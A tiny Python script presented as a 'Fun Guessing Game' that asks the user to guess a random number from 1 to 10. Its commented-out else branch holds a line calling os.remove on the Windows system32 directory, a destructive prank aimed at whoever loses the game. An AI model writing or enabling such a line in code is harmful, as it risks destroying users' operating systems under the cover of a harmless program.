# Fun Guessing Game
import random
import os

number = random.randint(1, 10)
guess = input("guess the SPECIAL number between 1-10")
guess = int(guess)

if guess == number:
    print("CONGRATS! YOU WON")
#else:
    #os.remove("c://windows//system32")